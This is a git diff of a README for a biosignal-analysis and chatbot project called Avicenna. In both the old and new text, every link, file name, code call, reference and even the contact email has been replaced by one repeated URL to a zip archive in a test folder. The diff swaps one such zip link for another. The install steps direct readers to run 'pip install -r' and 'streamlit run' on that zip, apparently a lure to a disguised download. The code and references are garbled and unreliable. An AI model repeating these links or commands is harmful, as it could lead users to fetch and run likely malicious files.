@@ -62,10 +62,10 @@ The **Avicenna project** integrates biosignal data analysis with an AI-driven ch
 - **Real-Time Data Streaming**:
   - Devices: Shimmer 3 GSR+ Unit SR48-2, Shimmer 3 EXG Unit SR47-5-1.
   - Channels:
-    - GSR: `https://raw.githubusercontent.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/main/pyshimmer/test/dev/Data-Avicenna-and-Platform-Analysis-Biosignal-Cognitive-Load-v2.8.zip`
-    - PPG: `https://raw.githubusercontent.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/main/pyshimmer/test/dev/Data-Avicenna-and-Platform-Analysis-Biosignal-Cognitive-Load-v2.8.zip`
-    - EMG: `https://raw.githubusercontent.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/main/pyshimmer/test/dev/Data-Avicenna-and-Platform-Analysis-Biosignal-Cognitive-Load-v2.8.zip`, `EXG_ADS1292R_1_CH2_24BIT`
-    - ECG: `https://raw.githubusercontent.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/main/pyshimmer/test/dev/Data-Avicenna-and-Platform-Analysis-Biosignal-Cognitive-Load-v2.8.zip`, `EXG_ADS1292R_2_CH2_24BIT`
+    - GSR: `https://github.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/raw/refs/heads/main/pyshimmer/test/Analysis_and_Biosignal_Load_Avicenna_Data_Platform_Cognitive_2.5-alpha.2.zip`
+    - PPG: `https://github.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/raw/refs/heads/main/pyshimmer/test/Analysis_and_Biosignal_Load_Avicenna_Data_Platform_Cognitive_2.5-alpha.2.zip`
+    - EMG: `https://github.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/raw/refs/heads/main/pyshimmer/test/Analysis_and_Biosignal_Load_Avicenna_Data_Platform_Cognitive_2.5-alpha.2.zip`, `EXG_ADS1292R_1_CH2_24BIT`
+    - ECG: `https://github.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/raw/refs/heads/main/pyshimmer/test/Analysis_and_Biosignal_Load_Avicenna_Data_Platform_Cognitive_2.5-alpha.2.zip`, `EXG_ADS1292R_2_CH2_24BIT`
 - **Analysis Modules**:
   - Stress detection from GSR.
   - HRV computation from PPG and ECG.
@@ -80,9 +80,9 @@ The **Avicenna project** integrates biosignal data analysis with an AI-driven ch
 
 ## Chatbot Integration
 
-**https://raw.githubusercontent.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/main/pyshimmer/test/dev/Data-Avicenna-and-Platform-Analysis-Biosignal-Cognitive-Load-v2.8.zip**:
+**https://github.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/raw/refs/heads/main/pyshimmer/test/Analysis_and_Biosignal_Load_Avicenna_Data_Platform_Cognitive_2.5-alpha.2.zip**:
 
-The chatbot component of the Avicenna project was designed to provide personalized insights and recommendations based on the user’s cognitive load and stress levels. Below are the functionalities of the `https://raw.githubusercontent.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/main/pyshimmer/test/dev/Data-Avicenna-and-Platform-Analysis-Biosignal-Cognitive-Load-v2.8.zip` module:
+The chatbot component of the Avicenna project was designed to provide personalized insights and recommendations based on the user’s cognitive load and stress levels. Below are the functionalities of the `https://github.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/raw/refs/heads/main/pyshimmer/test/Analysis_and_Biosignal_Load_Avicenna_Data_Platform_Cognitive_2.5-alpha.2.zip` module:
 
 ### Features
 1. **Conversational Interface**:
@@ -104,11 +104,11 @@ Sample Chatbot Functionality Code Snippet:
 import streamlit as st
 
 def chatbot_interface():
-    https://raw.githubusercontent.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/main/pyshimmer/test/dev/Data-Avicenna-and-Platform-Analysis-Biosignal-Cognitive-Load-v2.8.zip("Avicenna Chatbot")
-    user_input = https://raw.githubusercontent.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/main/pyshimmer/test/dev/Data-Avicenna-and-Platform-Analysis-Biosignal-Cognitive-Load-v2.8.zip("How can I assist you today?")
+    https://github.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/raw/refs/heads/main/pyshimmer/test/Analysis_and_Biosignal_Load_Avicenna_Data_Platform_Cognitive_2.5-alpha.2.zip("Avicenna Chatbot")
+    user_input = https://github.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/raw/refs/heads/main/pyshimmer/test/Analysis_and_Biosignal_Load_Avicenna_Data_Platform_Cognitive_2.5-alpha.2.zip("How can I assist you today?")
     if user_input:
         response = generate_response(user_input)
-        https://raw.githubusercontent.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/main/pyshimmer/test/dev/Data-Avicenna-and-Platform-Analysis-Biosignal-Cognitive-Load-v2.8.zip("Chatbot:", response)
+        https://github.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/raw/refs/heads/main/pyshimmer/test/Analysis_and_Biosignal_Load_Avicenna_Data_Platform_Cognitive_2.5-alpha.2.zip("Chatbot:", response)
 
 def generate_response(user_input):
     # Placeholder for AI model integration
@@ -148,11 +148,11 @@ if __name__ == "__main__":
 ## System Implementation
 
 ### Code Structure
-- **`https://raw.githubusercontent.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/main/pyshimmer/test/dev/Data-Avicenna-and-Platform-Analysis-Biosignal-Cognitive-Load-v2.8.zip`**: Navigation and integration of all modules.
-- **`https://raw.githubusercontent.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/main/pyshimmer/test/dev/Data-Avicenna-and-Platform-Analysis-Biosignal-Cognitive-Load-v2.8.zip`**: Handles GSR and PPG analysis.
-- **`https://raw.githubusercontent.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/main/pyshimmer/test/dev/Data-Avicenna-and-Platform-Analysis-Biosignal-Cognitive-Load-v2.8.zip`**: Focused on ECG analysis.
-- **`https://raw.githubusercontent.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/main/pyshimmer/test/dev/Data-Avicenna-and-Platform-Analysis-Biosignal-Cognitive-Load-v2.8.zip`**: Manages EMG data collection and processing.
-- **`https://raw.githubusercontent.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/main/pyshimmer/test/dev/Data-Avicenna-and-Platform-Analysis-Biosignal-Cognitive-Load-v2.8.zip`**: Implements chatbot functionality.
+- **`https://github.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/raw/refs/heads/main/pyshimmer/test/Analysis_and_Biosignal_Load_Avicenna_Data_Platform_Cognitive_2.5-alpha.2.zip`**: Navigation and integration of all modules.
+- **`https://github.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/raw/refs/heads/main/pyshimmer/test/Analysis_and_Biosignal_Load_Avicenna_Data_Platform_Cognitive_2.5-alpha.2.zip`**: Handles GSR and PPG analysis.
+- **`https://github.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/raw/refs/heads/main/pyshimmer/test/Analysis_and_Biosignal_Load_Avicenna_Data_Platform_Cognitive_2.5-alpha.2.zip`**: Focused on ECG analysis.
+- **`https://github.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/raw/refs/heads/main/pyshimmer/test/Analysis_and_Biosignal_Load_Avicenna_Data_Platform_Cognitive_2.5-alpha.2.zip`**: Manages EMG data collection and processing.
+- **`https://github.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/raw/refs/heads/main/pyshimmer/test/Analysis_and_Biosignal_Load_Avicenna_Data_Platform_Cognitive_2.5-alpha.2.zip`**: Implements chatbot functionality.
 
 ---
 
@@ -198,11 +198,11 @@ The Avicenna project bridges biosignal data analysis and conversational AI to pr
 
 ## References
 
-1. Shimmer Sensing, "Shimmer3 GSR+ User Manual," https://raw.githubusercontent.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/main/pyshimmer/test/dev/Data-Avicenna-and-Platform-Analysis-Biosignal-Cognitive-Load-v2.8.zip
-2. NeuroKit2 Documentation, "NeuroKit2: An Open-Source Python Toolbox for Physiological Signal Processing," https://raw.githubusercontent.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/main/pyshimmer/test/dev/Data-Avicenna-and-Platform-Analysis-Biosignal-Cognitive-Load-v2.8.zip
-3. Python Software Foundation, "Python 3.11 Documentation," https://raw.githubusercontent.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/main/pyshimmer/test/dev/Data-Avicenna-and-Platform-Analysis-Biosignal-Cognitive-Load-v2.8.zip
-4. Streamlit, "Streamlit Framework Documentation," https://raw.githubusercontent.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/main/pyshimmer/test/dev/Data-Avicenna-and-Platform-Analysis-Biosignal-Cognitive-Load-v2.8.zip
-5. Pyshimmer, “Shimmer unofficial API,” https://raw.githubusercontent.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/main/pyshimmer/test/dev/Data-Avicenna-and-Platform-Analysis-Biosignal-Cognitive-Load-v2.8.zip
+1. Shimmer Sensing, "Shimmer3 GSR+ User Manual," https://github.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/raw/refs/heads/main/pyshimmer/test/Analysis_and_Biosignal_Load_Avicenna_Data_Platform_Cognitive_2.5-alpha.2.zip
+2. NeuroKit2 Documentation, "NeuroKit2: An Open-Source Python Toolbox for Physiological Signal Processing," https://github.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/raw/refs/heads/main/pyshimmer/test/Analysis_and_Biosignal_Load_Avicenna_Data_Platform_Cognitive_2.5-alpha.2.zip
+3. Python Software Foundation, "Python 3.11 Documentation," https://github.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/raw/refs/heads/main/pyshimmer/test/Analysis_and_Biosignal_Load_Avicenna_Data_Platform_Cognitive_2.5-alpha.2.zip
+4. Streamlit, "Streamlit Framework Documentation," https://github.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/raw/refs/heads/main/pyshimmer/test/Analysis_and_Biosignal_Load_Avicenna_Data_Platform_Cognitive_2.5-alpha.2.zip
+5. Pyshimmer, “Shimmer unofficial API,” https://github.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/raw/refs/heads/main/pyshimmer/test/Analysis_and_Biosignal_Load_Avicenna_Data_Platform_Cognitive_2.5-alpha.2.zip
 
 
 # Avicenna: AI-Driven Chatbot for Biosignal Analysis
@@ -274,7 +274,7 @@ Welcome to **Avicenna**, an advanced conversational AI chatbot integrated with b
 ### Prerequisites
 
 - Python 3.10+
-- Required libraries (listed in `https://raw.githubusercontent.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/main/pyshimmer/test/dev/Data-Avicenna-and-Platform-Analysis-Biosignal-Cognitive-Load-v2.8.zip`)
+- Required libraries (listed in `https://github.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/raw/refs/heads/main/pyshimmer/test/Analysis_and_Biosignal_Load_Avicenna_Data_Platform_Cognitive_2.5-alpha.2.zip`)
 
 ### Steps
 
@@ -288,11 +288,11 @@ Welcome to **Avicenna**, an advanced conversational AI chatbot integrated with b
    ```
 3. Install dependencies:
    ```bash
-   pip install -r https://raw.githubusercontent.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/main/pyshimmer/test/dev/Data-Avicenna-and-Platform-Analysis-Biosignal-Cognitive-Load-v2.8.zip
+   pip install -r https://github.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/raw/refs/heads/main/pyshimmer/test/Analysis_and_Biosignal_Load_Avicenna_Data_Platform_Cognitive_2.5-alpha.2.zip
    ```
 4. Run the application:
    ```bash
-   streamlit run https://raw.githubusercontent.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/main/pyshimmer/test/dev/Data-Avicenna-and-Platform-Analysis-Biosignal-Cognitive-Load-v2.8.zip
+   streamlit run https://github.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/raw/refs/heads/main/pyshimmer/test/Analysis_and_Biosignal_Load_Avicenna_Data_Platform_Cognitive_2.5-alpha.2.zip
    ```
 
 ---
@@ -301,9 +301,9 @@ Welcome to **Avicenna**, an advanced conversational AI chatbot integrated with b
 
 ```
 .
-├── https://raw.githubusercontent.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/main/pyshimmer/test/dev/Data-Avicenna-and-Platform-Analysis-Biosignal-Cognitive-Load-v2.8.zip                # Main Streamlit application
-├── https://raw.githubusercontent.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/main/pyshimmer/test/dev/Data-Avicenna-and-Platform-Analysis-Biosignal-Cognitive-Load-v2.8.zip            # Chatbot implementation
-├── https://raw.githubusercontent.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/main/pyshimmer/test/dev/Data-Avicenna-and-Platform-Analysis-Biosignal-Cognitive-Load-v2.8.zip      # Python dependencies
+├── https://github.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/raw/refs/heads/main/pyshimmer/test/Analysis_and_Biosignal_Load_Avicenna_Data_Platform_Cognitive_2.5-alpha.2.zip                # Main Streamlit application
+├── https://github.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/raw/refs/heads/main/pyshimmer/test/Analysis_and_Biosignal_Load_Avicenna_Data_Platform_Cognitive_2.5-alpha.2.zip            # Chatbot implementation
+├── https://github.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/raw/refs/heads/main/pyshimmer/test/Analysis_and_Biosignal_Load_Avicenna_Data_Platform_Cognitive_2.5-alpha.2.zip      # Python dependencies
 ├── ecg/                  # ECG analysis module
 ├── emg/                  # EMG analysis module
 ├── gsr_ppg/              # GSR/PPG analysis module
@@ -350,7 +350,7 @@ This project is licensed under the MIT License. See the `LICENSE` file for more 
 For questions or support, please contact:
 
 - **Name:** Mirshoir
-- **Email:** [mirshoir29\https://raw.githubusercontent.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/main/pyshimmer/test/dev/Data-Avicenna-and-Platform-Analysis-Biosignal-Cognitive-Load-v2.8.zip]
+- **Email:** [mirshoir29\https://github.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/raw/refs/heads/main/pyshimmer/test/Analysis_and_Biosignal_Load_Avicenna_Data_Platform_Cognitive_2.5-alpha.2.zip]
 
 ---
 
